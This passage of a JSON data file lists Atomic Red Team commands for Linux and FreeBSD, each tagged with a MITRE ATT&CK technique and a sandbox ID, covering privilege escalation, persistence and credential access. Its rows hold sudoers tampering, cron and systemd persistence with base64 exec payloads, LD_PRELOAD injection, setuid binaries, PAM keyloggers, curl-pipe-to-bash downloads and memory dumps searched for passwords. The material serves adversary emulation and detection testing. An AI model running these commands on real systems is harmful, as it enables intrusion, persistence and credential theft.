+"command": "which_python=`which python || which python3` && $which_python -c \"import tarfile; output_file = tarfile.open('#{path_to_output_file}','w'); output_file.add('#{path_to_input_file}'); output_file.close()\"",
+"row_index": 234,
+"sandbox": "1773608303_T1560.002_4_234",
+"tactic": "collection",
+"technique": "T1560.002",
+"test": "4",
+"test_name": "Compressing data using tarfile in Python (FreeBSD/Linux)"
+},
+{
+"command": "sudo -l && sudo cat /etc/sudoers && sudo vim /etc/sudoers",
+"row_index": 235,
+"sandbox": "1773608423_T1548.003_1_235",
+"tactic": "privilege-escalation",
+"technique": "T1548.003",
+"test": "1",
+"test_name": "Sudo usage"
+},
+{
+"command": "sudo -l && sudo cat /usr/local/etc/sudoers && sudo ee /usr/local/etc/sudoers",
+"row_index": 236,
+"sandbox": "1773608544_T1548.003_2_236",
+"tactic": "privilege-escalation",
+"technique": "T1548.003",
+"test": "2",
+"test_name": "Sudo usage (freebsd)"
+},
+{
+"command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers && sudo visudo -c -f /etc/sudoers",
+"row_index": 237,
+"sandbox": "1773608664_T1548.003_3_237",
+"tactic": "privilege-escalation",
+"technique": "T1548.003",
+"test": "3",
+"test_name": "Unlimited sudo cache timeout"
+},
+{
+"command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers && sudo visudo -c -f /usr/local/etc/sudoers",
+"row_index": 238,
+"sandbox": "1773608784_T1548.003_4_238",
+"tactic": "privilege-escalation",
+"technique": "T1548.003",
+"test": "4",
+"test_name": "Unlimited sudo cache timeout (freebsd)"
+},
+{
+"command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\" && sudo visudo -c -f /etc/sudoers",
+"row_index": 239,
+"sandbox": "1773608904_T1548.003_5_239",
+"tactic": "privilege-escalation",
+"technique": "T1548.003",
+"test": "5",
+"test_name": "Disable tty_tickets for sudo caching"
+},
+{
+"command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /usr/local/etc/sudoers\" && sudo visudo -c -f /usr/local/etc/sudoers",
+"row_index": 240,
+"sandbox": "1773609024_T1548.003_6_240",
+"tactic": "privilege-escalation",
+"technique": "T1548.003",
+"test": "6",
+"test_name": "Disable tty_tickets for sudo caching (freebsd)"
+},
+{
+"command": "crontab -l > /tmp/notevil && echo \"* * * * * #{command}\" > #{tmp_cron} && crontab #{tmp_cron}",
+"row_index": 241,
+"sandbox": "1773609144_T1053.003_1_241",
+"tactic": "privilege-escalation",
+"technique": "T1053.003",
+"test": "1",
+"test_name": "Cron - Replace crontab with referenced file"
+},
+{
+"command": "echo \"#{command}\" > /etc/cron.daily/#{cron_script_name} && echo \"#{command}\" > /etc/cron.hourly/#{cron_script_name} && echo \"#{command}\" > /etc/cron.monthly/#{cron_script_name} && echo \"#{command}\" > /etc/cron.weekly/#{cron_script_name}",
+"row_index": 242,
+"sandbox": "1773609264_T1053.003_2_242",
+"tactic": "privilege-escalation",
+"technique": "T1053.003",
+"test": "2",
+"test_name": "Cron - Add script to all cron subfolders"
+},
+{
+"command": "echo \"#{command}\" > /etc/cron.d/#{cron_script_name}",
+"row_index": 243,
+"sandbox": "1773609384_T1053.003_3_243",
+"tactic": "privilege-escalation",
+"technique": "T1053.003",
+"test": "3",
+"test_name": "Cron - Add script to /etc/cron.d folder"
+},
+{
+"command": "echo \"#{command}\" >> /var/spool/cron/crontabs/#{cron_script_name}",
+"row_index": 244,
+"sandbox": "1773609504_T1053.003_4_244",
+"tactic": "privilege-escalation",
+"technique": "T1053.003",
+"test": "4",
+"test_name": "Cron - Add script to /var/spool/cron/crontabs/ folder"
+},
+{
+"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'",
+"row_index": 245,
+"sandbox": "1773609624_T1546.005_1_245",
+"tactic": "privilege-escalation",
+"technique": "T1546.005",
+"test": "1",
+"test_name": "Trap EXIT"
+},
+{
+"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'",
+"row_index": 246,
+"sandbox": "1773609745_T1546.005_2_246",
+"tactic": "privilege-escalation",
+"technique": "T1546.005",
+"test": "2",
+"test_name": "Trap EXIT (freebsd)"
+},
+{
+"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'",
+"row_index": 247,
+"sandbox": "1773609865_T1546.005_3_247",
+"tactic": "privilege-escalation",
+"technique": "T1546.005",
+"test": "3",
+"test_name": "Trap SIGINT"
+},
+{
+"command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'",
+"row_index": 248,
+"sandbox": "1773609985_T1546.005_4_248",
+"tactic": "privilege-escalation",
+"technique": "T1546.005",
+"test": "4",
+"test_name": "Trap SIGINT (freebsd)"
+},
+{
+"command": "sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'",
+"row_index": 249,
+"sandbox": "1773610105_T1574.006_1_249",
+"tactic": "privilege-escalation",
+"technique": "T1574.006",
+"test": "1",
+"test_name": "Shared Library Injection via /etc/ld.so.preload"
+},
+{
+"command": "LD_PRELOAD=#{path_to_shared_library} ls",
+"row_index": 250,
+"sandbox": "1773610225_T1574.006_2_250",
+"tactic": "privilege-escalation",
+"technique": "T1574.006",
+"test": "2",
+"test_name": "Shared Library Injection via LD_PRELOAD"
+},
+{
+"command": "cp #{payload} /tmp/hello.c && sudo chown root /tmp/hello.c && sudo make /tmp/hello && sudo chown root /tmp/hello && sudo chmod u+s /tmp/hello && /tmp/hello",
+"row_index": 251,
+"sandbox": "1773610345_T1548.001_1_251",
+"tactic": "privilege-escalation",
+"technique": "T1548.001",
+"test": "1",
+"test_name": "Make and modify binary from C source"
+},
+{
+"command": "cp #{payload} /tmp/hello.c && chown root /tmp/hello.c && make /tmp/hello && chown root /tmp/hello && chmod u+s /tmp/hello && /tmp/hello",
+"row_index": 252,
+"sandbox": "1773610465_T1548.001_2_252",
+"tactic": "privilege-escalation",
+"technique": "T1548.001",
+"test": "2",
+"test_name": "Make and modify binary from C source (freebsd)"
+},
+{
+"command": "sudo touch #{file_to_setuid} && sudo chown root #{file_to_setuid} && sudo chmod u+xs #{file_to_setuid}",
+"row_index": 253,
+"sandbox": "1773610585_T1548.001_3_253",
+"tactic": "privilege-escalation",
+"technique": "T1548.001",
+"test": "3",
+"test_name": "Set a SetUID flag on file"
+},
+{
+"command": "touch #{file_to_setuid} && chown root #{file_to_setuid} && chmod u+xs #{file_to_setuid}",
+"row_index": 254,
+"sandbox": "1773610705_T1548.001_4_254",
+"tactic": "privilege-escalation",
+"technique": "T1548.001",
+"test": "4",
+"test_name": "Set a SetUID flag on file (freebsd)"
+},
+{
+"command": "sudo touch #{file_to_setuid} && sudo chown root #{file_to_setuid} && sudo chmod g+xs #{file_to_setuid}",
+"row_index": 255,
+"sandbox": "1773610826_T1548.001_5_255",
+"tactic": "privilege-escalation",
+"technique": "T1548.001",
+"test": "5",
+"test_name": "Set a SetGID flag on file"
+},
+{
+"command": "touch #{file_to_setuid} && chown root #{file_to_setuid} && chmod g+xs #{file_to_setuid}",
+"row_index": 256,
+"sandbox": "1773610946_T1548.001_6_256",
+"tactic": "privilege-escalation",
+"technique": "T1548.001",
+"test": "6",
+"test_name": "Set a SetGID flag on file (freebsd)"
+},
+{
+"command": "cp #{payload} /tmp/cap.c && make /tmp/cap && sudo setcap cap_setuid=ep /tmp/cap && /tmp/cap",
+"row_index": 257,
+"sandbox": "1773611066_T1548.001_7_257",
+"tactic": "privilege-escalation",
+"technique": "T1548.001",
+"test": "7",
+"test_name": "Make and modify capabilities of a binary"
+},
+{
+"command": "touch #{file_to_setcap} && sudo setcap cap_setuid=ep #{file_to_setcap}",
+"row_index": 258,
+"sandbox": "1773611186_T1548.001_8_258",
+"tactic": "privilege-escalation",
+"technique": "T1548.001",
+"test": "8",
+"test_name": "Provide the SetUID capability to a file"
+},
+{
+"command": "find /usr/bin -perm -4000",
+"row_index": 259,
+"sandbox": "1773611306_T1548.001_9_259",
+"tactic": "privilege-escalation",
+"technique": "T1548.001",
+"test": "9",
+"test_name": "Do reconnaissance for files that have the setuid bit set"
+},
+{
+"command": "find /usr/bin -perm -2000",
+"row_index": 260,
+"sandbox": "1773611426_T1548.001_10_260",
+"tactic": "privilege-escalation",
+"technique": "T1548.001",
+"test": "10",
+"test_name": "Do reconnaissance for files that have the setgid bit set"
+},
+{
+"command": "if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo \"$ssh_authorized_keys\" > ~/.ssh/authorized_keys; fi;",
+"row_index": 261,
+"sandbox": "1773611546_T1098.004_1_261",
+"tactic": "privilege-escalation",
+"technique": "T1098.004",
+"test": "1",
+"test_name": "Modify SSH Authorized Keys"
+},
+{
+"command": "sudo insmod #{module_path}",
+"row_index": 262,
+"sandbox": "1773611666_T1547.006_1_262",
+"tactic": "privilege-escalation",
+"technique": "T1547.006",
+"test": "1",
+"test_name": "Linux - Load Kernel Module via insmod"
+},
+{
+"command": "echo \"[Unit]\" > #{path_to_systemd_service} && echo \"Description=Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_service} && echo \"[Service]\" >> #{path_to_systemd_service} && echo \"Type=simple\" >> #{path_to_systemd_service} && echo \"ExecStart=/bin/touch /tmp/art-systemd-timer-marker\" >> #{path_to_systemd_service} && echo \"[Install]\" >> #{path_to_systemd_service} && echo \"WantedBy=multi-user.target\" >> #{path_to_systemd_service} && echo \"[Unit]\" > #{path_to_systemd_timer} && echo \"Description=Executes Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_timer} && echo \"Requires=#{systemd_service_name}\" >> #{path_to_systemd_timer} && echo \"[Timer]\" >> #{path_to_systemd_timer} && echo \"Unit=#{systemd_service_name}\" >> #{path_to_systemd_timer} && echo \"OnCalendar=*-*-* *:*:00\" >> #{path_to_systemd_timer} && echo \"[Install]\" >> #{path_to_systemd_timer} && echo \"WantedBy=timers.target\" >> #{path_to_systemd_timer} && systemctl start #{systemd_timer_name} && systemctl enable #{systemd_timer_name} && systemctl daemon-reload",
+"row_index": 263,
+"sandbox": "1773611786_T1053.006_1_263",
+"tactic": "privilege-escalation",
+"technique": "T1053.006",
+"test": "1",
+"test_name": "Create Systemd Service and Timer"
+},
+{
+"command": "systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'",
+"row_index": 264,
+"sandbox": "1773611907_T1053.006_2_264",
+"tactic": "privilege-escalation",
+"technique": "T1053.006",
+"test": "2",
+"test_name": "Create a user level transient systemd service and timer"
+},
+{
+"command": "systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'",
+"row_index": 265,
+"sandbox": "1773611973_T1053.006_3_265",
+"tactic": "privilege-escalation",
+"technique": "T1053.006",
+"test": "3",
+"test_name": "Create a system level transient systemd service and timer"
+},
+{
+"command": "echo '#{command_to_add}' >> ~/.bash_profile",
+"row_index": 266,
+"sandbox": "1773612094_T1546.004_1_266",
+"tactic": "privilege-escalation",
+"technique": "T1546.004",
+"test": "1",
+"test_name": "Add command to .bash_profile"
+},
+{
+"command": "echo '#{command_to_add}' >> ~/.bashrc",
+"row_index": 267,
+"sandbox": "1773612214_T1546.004_2_267",
+"tactic": "privilege-escalation",
+"technique": "T1546.004",
+"test": "2",
+"test_name": "Add command to .bashrc"
+},
+{
+"command": "echo '#{command_to_add}' >> ~/.shrc",
+"row_index": 268,
+"sandbox": "1773612334_T1546.004_3_268",
+"tactic": "privilege-escalation",
+"technique": "T1546.004",
+"test": "3",
+"test_name": "Add command to .shrc"
+},
+{
+"command": "echo '#{text_to_append}' >> /etc/profile",
+"row_index": 269,
+"sandbox": "1773612454_T1546.004_4_269",
+"tactic": "privilege-escalation",
+"technique": "T1546.004",
+"test": "4",
+"test_name": "Append to the system shell profile"
+},
+{
+"command": "echo '#{text_to_append}' >> ~/.profile",
+"row_index": 270,
+"sandbox": "1773612574_T1546.004_5_270",
+"tactic": "privilege-escalation",
+"technique": "T1546.004",
+"test": "5",
+"test_name": "Append commands user shell profile"
+},
+{
+"command": "echo '#{text_to_append}' >> /etc/profile.d/bash_completion.sh",
+"row_index": 271,
+"sandbox": "1773612694_T1546.004_6_271",
+"tactic": "privilege-escalation",
+"technique": "T1546.004",
+"test": "6",
+"test_name": "System shell profile scripts"
+},
+{
+"command": "useradd --create-home --shell /bin/bash art && su -l art -c \"echo 'echo \\\"Atomic Red Team was here... T1546.004\\\" >> /home/art/art.txt' >> /home/art/.bash_logout; exit\"",
+"row_index": 272,
+"sandbox": "1773612814_T1546.004_7_272",
+"tactic": "privilege-escalation",
+"technique": "T1546.004",
+"test": "7",
+"test_name": "Create/Append to .bash_logout"
+},
+{
+"command": "TEMPDIR=\"/tmp/atomic_sitecust_posix\" && mkdir -p \"$TEMPDIR\" && \"#{python_exe}\" -m venv \"$TEMPDIR/env\" && SITE_PACKAGES=$(\"$TEMPDIR/env/bin/#{python_exe}\" -c \"import site; print(site.getsitepackages()[0])\") && echo \"import os; os.system('cat /etc/passwd 1> /tmp/atomic_hook_poc.txt')\" > \"$SITE_PACKAGES/atomic_hook.pth\" && ls -la \"$SITE_PACKAGES/atomic_hook.pth\" && \"$TEMPDIR/env/bin/python\" -c \"print('Triggering Hook via atomic_hook...')\" && if [ -f /tmp/atomic_hook_poc.txt ]; then echo \"[+] Success: atomic_hook_poc.txt created under /tmp \\n\" $(ls -la /tmp/ | grep -w atomic_hook_poc.txt); else echo \"Failed: /tmp/atomic_hook_poc.txt not found\"; fi",
+"row_index": 273,
+"sandbox": "1773612934_T1546.018_3_273",
+"tactic": "privilege-escalation",
+"technique": "T1546.018",
+"test": "3",
+"test_name": "Python Startup Hook - atomic_hook.pth (Linux)"
+},
+{
+"command": "PYTHON_EXE=$(command -v #{python_exe} || command -v python) && USER_PACKAGES=$($PYTHON_EXE -c \"import site; print(site.getusersitepackages())\") && mkdir -p \"$USER_PACKAGES\" && echo \"import os; os.system('date > /tmp/poc.txt')\" > \"$USER_PACKAGES/usercustomize.py\" && if [ -f \"$USER_PACKAGES/usercustomize.py\" ]; then echo \"Success: usercustomize.py created under $USER_PACKAGES\\n\" $(ls -la \"$USER_PACKAGES\" | grep usercustomize*); else echo \"Failed: usercustomize.py not found under $USER_PACKAGES\"; fi && $PYTHON_EXE -c \"print('Triggering Hook via usercustomize.py...')\" && if [ -f /tmp/poc.txt ]; then echo \"Success: poc.txt created under /tmp\\n\" $(ls -la /tmp/ | grep -w poc.txt); else echo \"Failed: /tmp/poc.txt not found\"; fi",
+"row_index": 274,
+"sandbox": "1773613054_T1546.018_5_274",
+"tactic": "privilege-escalation",
+"technique": "T1546.018",
+"test": "5",
+"test_name": "Python Startup Hook - usercustomize.py (Linux / MacOS)"
+},
+{
+"command": "filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi && printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common && echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common && printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common && sudo chmod +x /etc/rc.common",
+"row_index": 275,
+"sandbox": "1773613175_T1037.004_2_275",
+"tactic": "privilege-escalation",
+"technique": "T1037.004",
+"test": "2",
+"test_name": "rc.common"
+},
+{
+"command": "filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi && [ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local && echo \"\\npython3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\"\" | sudo tee -a /etc/rc.local && printf 'exit 0' | sudo tee -a /etc/rc.local && sudo chmod +x /etc/rc.local",
+"row_index": 276,
+"sandbox": "1773613295_T1037.004_3_276",
+"tactic": "privilege-escalation",
+"technique": "T1037.004",
+"test": "3",
+"test_name": "rc.local"
+},
+{
+"command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file} && echo \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"Type=simple\" && echo \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file} && echo \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file} && systemctl daemon-reload && systemctl enable #{systemd_service_file} && systemctl start #{systemd_service_file}",
+"row_index": 277,
+"sandbox": "1773613415_T1543.002_1_277",
+"tactic": "privilege-escalation",
+"technique": "T1543.002",
+"test": "1",
+"test_name": "Create Systemd Service"
+},
+{
+"command": "echo '#\\!/bin/sh' > #{rc_service_path}/#{rc_service_file} && echo ' ' >> #{rc_service_path}/#{rc_service_file} && echo '#' >> #{rc_service_path}/#{rc_service_file} && echo '# PROVIDE: art-test' >> #{rc_service_path}/#{rc_service_file} && echo '# REQUIRE: LOGIN' >> #{rc_service_path}/#{rc_service_file} && echo '# KEYWORD: shutdown' >> #{rc_service_path}/#{rc_service_file} && echo ' ' >> #{rc_service_path}/#{rc_service_file} && echo '. /etc/rc.subr' >> #{rc_service_path}/#{rc_service_file} && echo ' ' >> #{rc_service_path}/#{rc_service_file} && echo 'name=\"art_test\"' >> #{rc_service_path}/#{rc_service_file} && echo 'rcvar=art_test_enable' >> #{rc_service_path}/#{rc_service_file} && echo 'load_rc_config ${name}' >> #{rc_service_path}/#{rc_service_file} && echo 'command=\"/usr/bin/touch\"' >> #{rc_service_path}/#{rc_service_file} && echo 'start_cmd=\"art_test_start\"' >> #{rc_service_path}/#{rc_service_file} && echo '' >> #{rc_service_path}/#{rc_service_file} && echo 'art_test_start()' >> #{rc_service_path}/#{rc_service_file} && echo '{' >> #{rc_service_path}/#{rc_service_file} && echo '  ${command} /tmp/art-test.marker' >> #{rc_service_path}/#{rc_service_file} && echo '}' >> #{rc_service_path}/#{rc_service_file} && echo ' ' >> #{rc_service_path}/#{rc_service_file} && echo 'run_rc_command \"$1\"' >> #{rc_service_path}/#{rc_service_file} && chmod +x #{rc_service_path}/#{rc_service_file} && service art-test enable && service art-test start",
+"row_index": 278,
+"sandbox": "1773613535_T1543.002_2_278",
+"tactic": "privilege-escalation",
+"technique": "T1543.002",
+"test": "2",
+"test_name": "Create SysV Service"
+},
+{
+"command": "echo \"#!/bin/bash\" > /etc/init.d/T1543.002 && echo \"### BEGIN INIT INFO\" >> /etc/init.d/T1543.002 && echo \"# Provides : Atomic Test T1543.002\" >> /etc/init.d/T1543.002 && echo \"# Required-Start: \\$all\" >> /etc/init.d/T1543.002 && echo \"# Required-Stop : \" >> /etc/init.d/T1543.002 && echo \"# Default-Start: 2 3 4 5\" >> /etc/init.d/T1543.002 && echo \"# Default-Stop: \" >> /etc/init.d/T1543.002 && echo \"# Short Description: Atomic Test for Systemd Service Creation\" >> /etc/init.d/T1543.002 && echo \"### END INIT INFO\" >> /etc/init.d/T1543.002 && echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \\\" \" >> /etc/init.d/T1543.002 && chmod +x /etc/init.d/T1543.002 && if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali OR centos\" ; fi && systemctl enable T1543.002 && systemctl start T1543.002 && echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\" | sudo tee -a /etc/init.d/T1543.002 && systemctl daemon-reload && systemctl restart T1543.002",
+"row_index": 279,
+"sandbox": "1773613655_T1543.002_3_279",
+"tactic": "privilege-escalation",
+"technique": "T1543.002",
+"test": "3",
+"test_name": "Create Systemd Service file,  Enable the service , Modify and Reload the service."
+},
+{
+"command": "echo \"#{at_command}\" | at #{time_spec}",
+"row_index": 280,
+"sandbox": "1773613775_T1053.002_2_280",
+"tactic": "privilege-escalation",
+"technique": "T1053.002",
+"test": "2",
+"test_name": "At - Schedule a job"
+},
+{
+"command": "password=$(openssl passwd -1 art) && ([ \"$(uname)\" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0)) && su art -c \"whoami; exit\"",
+"row_index": 281,
+"sandbox": "1773613895_T1078.003_8_281",
+"tactic": "privilege-escalation",
+"technique": "T1078.003",
+"test": "8",
+"test_name": "Create local account (Linux)"
+},
+{
+"command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art && usermod --lock art && usermod --expiredate \"1\" art && usermod --unlock art && usermod --expiredate \"99999\" art && su -c whoami art",
+"row_index": 282,
+"sandbox": "1773614015_T1078.003_9_282",
+"tactic": "privilege-escalation",
+"technique": "T1078.003",
+"test": "9",
+"test_name": "Reactivate a locked/expired account (Linux)"
+},
+{
+"command": "pw useradd art -g wheel -s /bin/sh && echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0 && pw lock art && pw usermod art -e +1d && pw unlock art && pw user mod art -e +99d && su art && whoami && exit",
+"row_index": 283,
+"sandbox": "1773614135_T1078.003_10_283",
+"tactic": "privilege-escalation",
+"technique": "T1078.003",
+"test": "10",
+"test_name": "Reactivate a locked/expired account (FreeBSD)"
+},
+{
+"command": "cat /etc/passwd |grep nobody && chsh --shell /bin/bash nobody && usermod --password $(openssl passwd -1 nobody) nobody && su -c \"whoami\" nobody",
+"row_index": 284,
+"sandbox": "1773614256_T1078.003_11_284",
+"tactic": "privilege-escalation",
+"technique": "T1078.003",
+"test": "11",
+"test_name": "Login as nobody (Linux)"
+},
+{
+"command": "cat /etc/passwd |grep nobody && pw usermod nobody -s /bin/sh && echo $(openssl passwd -1 art) | pw mod user nobody -h 0 && su nobody && whoami && exit",
+"row_index": 285,
+"sandbox": "1773614376_T1078.003_12_285",
+"tactic": "privilege-escalation",
+"technique": "T1078.003",
+"test": "12",
+"test_name": "Login as nobody (freebsd)"
+},
+{
+"command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}",
+"row_index": 286,
+"sandbox": "1773614496_T1556.003_1_286",
+"tactic": "credential-access",
+"technique": "T1556.003",
+"test": "1",
+"test_name": "Malicious PAM rule"
+},
+{
+"command": "sudo sed -i \"\" \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}",
+"row_index": 287,
+"sandbox": "1773614616_T1556.003_2_287",
+"tactic": "credential-access",
+"technique": "T1556.003",
+"test": "2",
+"test_name": "Malicious PAM rule (freebsd)"
+},
+{
+"command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}",
+"row_index": 288,
+"sandbox": "1773614736_T1556.003_3_288",
+"tactic": "credential-access",
+"technique": "T1556.003",
+"test": "3",
+"test_name": "Malicious PAM module"
+},
+{
+"command": "if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; && if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; && sudo touch /tmp/password-auth.bk && sudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so && enable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so && enable=* log_password\" >> /etc/pam.d/system-auth",
+"row_index": 289,
+"sandbox": "1773614856_T1056.001_2_289",
+"tactic": "credential-access",
+"technique": "T1056.001",
+"test": "2",
+"test_name": "Living off the land Terminal Input Capture on Linux with pam.d"
+},
+{
+"command": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")' && echo \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\" && tail /var/log/syslog",
+"row_index": 290,
+"sandbox": "1773614976_T1056.001_3_290",
+"tactic": "credential-access",
+"technique": "T1056.001",
+"test": "3",
+"test_name": "Logging bash history to syslog"
+},
+{
+"command": "PS2=`logger -t \"$USER\" -f ~/.sh_history` && $PS2 && tail /var/log/messages",
+"row_index": 291,
+"sandbox": "1773615096_T1056.001_4_291",
+"tactic": "credential-access",
+"technique": "T1056.001",
+"test": "4",
+"test_name": "Logging sh history to syslog/messages"
+},
+{
+"command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> #{output_file}' DEBUG && echo \"Hello World!\" && cat #{output_file}",
+"row_index": 292,
+"sandbox": "1773615216_T1056.001_5_292",
+"tactic": "credential-access",
+"technique": "T1056.001",
+"test": "5",
+"test_name": "Bash session based keylogger"
+},
+{
+"command": "cp -v /etc/pam.d/sshd /tmp/ && echo \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd && systemctl restart sshd && systemctl restart auditd && ssh #{user_account}@localhost && whoami && sudo su && whoami && exit && exit",
+"row_index": 293,
+"sandbox": "1773615337_T1056.001_6_293",
+"tactic": "credential-access",
+"technique": "T1056.001",
+"test": "6",
+"test_name": "SSHD PAM keylogger"
+},
+{
+"command": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS && auditctl -a always,exit -F arch=b32 -S execve -k CMDS && whoami; ausearch -i --start now",
+"row_index": 294,
+"sandbox": "1773615457_T1056.001_7_294",
+"tactic": "credential-access",
+"technique": "T1056.001",
+"test": "7",
+"test_name": "Auditd keylogger"
+},
+{
+"command": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art && su -c \"cd /tmp; curl -s #{remote_url} | bash\" art",
+"row_index": 295,
+"sandbox": "1773615577_T1110.001_5_295",
+"tactic": "credential-access",
+"technique": "T1110.001",
+"test": "5",
+"test_name": "SUDO Brute Force - Debian"
+},
+{
+"command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art && su art && cd /tmp && curl -s #{remote_url} |bash",
+"row_index": 296,
+"sandbox": "1773615697_T1110.001_6_296",
+"tactic": "credential-access",
+"technique": "T1110.001",
+"test": "6",
+"test_name": "SUDO Brute Force - Redhat"
+},
+{
+"command": "pw adduser art -g wheel -s /bin/sh && echo \"password123\" | pw usermod art -h 0 && su art && cd /tmp && curl -s #{remote_url} |bash",
+"row_index": 297,
+"sandbox": "1773615817_T1110.001_7_297",
+"tactic": "credential-access",
+"technique": "T1110.001",
+"test": "7",
+"test_name": "SUDO Brute Force - FreeBSD"
+},
+{
+"command": "sh #{script_path} && PID=$(pgrep -n -f \"#{pid_term}\") && HEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1) && MEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1)))) && MEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2)))) && MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START))) && dd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\" && grep -i \"PASS\" \"#{output_file}\"",
+"row_index": 298,
+"sandbox": "1773615937_T1003.007_1_298",
+"tactic": "credential-access",
+"technique": "T1003.007",
+"test": "1",
+"test_name": "Dump individual process memory with sh (Local)"
+},
+{
